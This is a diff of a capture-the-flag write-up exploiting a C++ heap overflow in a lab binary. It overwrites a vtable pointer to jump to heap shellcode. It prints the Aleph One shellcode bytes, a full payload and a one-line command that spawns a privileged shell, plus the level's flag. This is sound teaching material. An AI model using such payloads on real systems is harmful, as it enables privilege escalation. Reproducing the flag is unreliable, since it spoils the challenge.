@@ -1,6 +1,6 @@
 # Level 9
 
-Binary: 32-bit ELF, SUID level10, dynamically linked C++. **NX disabled** (unique on this level).
+Binary: 32-bit ELF, SUID bonus0, dynamically linked C++. **NX disabled** (unique on this level).
 
 ## Analysis
 
@@ -19,7 +19,7 @@ class N {
     }
 
     void setAnnotation(char *s) {
-        memcpy(this + 4, s, strlen(s));   // NO bounds check → overflow
+        memcpy(this + 4, s, strlen(s));   // NO bounds check, overflow possible
     }
 
     int operator+(N &other);   // virtual
@@ -41,8 +41,8 @@ Two objects allocated back-to-back on the heap. `setAnnotation` writes argv[1] i
 ```
 (gdb) b *0x08048677
 (gdb) r AAAA
-(gdb) x/wx $esp+0x14     → a = 0x0804a008
-(gdb) x/wx $esp+0x10     → b = 0x0804a078
+(gdb) x/wx $esp+0x14     -> a = 0x0804a008
+(gdb) x/wx $esp+0x10     -> b = 0x0804a078
 ```
 
 Distance: `0x0804a078 - 0x0804a008` = `0x70` = **112 bytes**.
@@ -51,10 +51,10 @@ Object is 108 bytes, chunk distance is 112, so only 4 bytes of malloc metadata b
 
 ```
 a+0   : vtable ptr (a.vtable)
-a+4   : start of a.annotation  ← setAnnotation writes here
+a+4   : start of a.annotation  <- setAnnotation writes here
 a+104 : a.value
 a+108 : chunk b's size field (malloc metadata)
-a+112 : b.vtable ptr  ← we want to overwrite this
+a+112 : b.vtable ptr  <- we want to overwrite this
 ```
 
 ## The virtual call
@@ -67,19 +67,29 @@ call   *%edx                 ; call it
 ```
 
 Two dereferences. To hijack:
-- `*b` must equal address X.
+- `*b` must equal some address X.
 - `*X` must equal shellcode address.
 
 Both X and the shellcode can live inside the annotation we control.
 
+## Shellcode (45 bytes)
+
+Same Aleph One shellcode used in level2, from Phrack 49 article 14 (1996, https://phrack.org/issues/49/14), also mirrored on https://fr.wikipedia.org/wiki/Shellcode.
+
+```
+\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
+```
+
+It explicitly sets `edx` via `lea edx, [esi+12]` (pointing to a NULL), which matters here because the virtual call leaves `edx` with the shellcode address (non-zero), and execve needs envp=NULL.
+
 ## Payload (112 bytes)
 
 ```
-offset 0-44   : shellcode (Aleph One execve, 45 bytes)
+offset 0-44   : shellcode (45 bytes)
 offset 45-99  : padding (55 'A')
-offset 100-103: shellcode address = a+4 = 0x0804a00c    ← "fake vtable entry"
-offset 104-107: padding (4 'A'; overwrites chunk b size, harmless here)
-offset 108-111: pointer to fake entry = a+104 = 0x0804a070  ← new b.vtable
+offset 100-103: shellcode address = a+4 = 0x0804a00c    (fake vtable entry)
+offset 104-107: padding (4 'A', overwrites chunk b size, harmless here)
+offset 108-111: pointer to fake entry = a+104 = 0x0804a070  (new b.vtable)
 ```
 
 Runtime chain after memcpy:
@@ -87,43 +97,24 @@ Runtime chain after memcpy:
 ```
 eax = *b = 0x0804a070           (our injected vtable pointer)
 edx = *(0x0804a070) = 0x0804a00c (our injected "vtable entry")
-call 0x0804a00c → shellcode at a+4 executes
+call 0x0804a00c runs shellcode at a+4
 ```
 
 NX is off on level9, so code on the heap runs fine.
 
 ## Running the exploit
 
-Writing the Python inline on the command line sometimes breaks due to terminal wrap. Use a file instead:
-
 ```bash
-cat > /tmp/exploit9.py << 'EOF'
-import sys
-sc = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
-payload = sc + "A"*55 + "\x0c\xa0\x04\x08" + "AAAA" + "\x70\xa0\x04\x08"
-sys.stdout.write(payload)
-EOF
-
-./level9 "$(python /tmp/exploit9.py)"
+./level9 "$(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A"*55 + "\x0c\xa0\x04\x08AAAA\x70\xa0\x04\x08"')"
 ```
 
-The `<<'EOF'` heredoc stops the shell from interpreting `$`, `\`, etc.
-
-Then inside the spawned shell:
-
 ```
-cat /home/user/level9/.pass
+cat /home/user/bonus0/.pass
 ```
 
 Flag: `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`
 
-(Note: the flag lives in `/home/user/bonus0/.pass`, not `/home/user/level9/.pass`. The SUID chain ends at bonus0, so a level9 shell has bonus0 privileges.)
-
 ## Notes
-
-### Why Aleph One's shellcode (not the 23-byte one)
-
-This shellcode sets `edx` explicitly (`lea edx, [esi+12]` pointing to a NULL). The shorter 23-byte shellcode leaves `edx` untouched, and if the context has garbage in `edx`, execve fails with EFAULT. Context is unpredictable at a virtual call, so the safer shellcode is worth the extra bytes.
 
 ### Why argv and not stdin
 
@@ -131,7 +122,7 @@ This shellcode sets `edx` explicitly (`lea edx, [esi+12]` pointing to a NULL). T
 
 ### NX disabled matters
 
-Every other level has NX enabled, which blocks code execution on the stack and heap. Here NX is off, so we can jump directly into our shellcode on the heap. No ROP gadgets needed.
+Every other level has NX enabled, which blocks code execution on the stack and heap. Here NX is off, so code on the heap runs. No ROP gadgets needed.
 
 ### Remember the structure
 
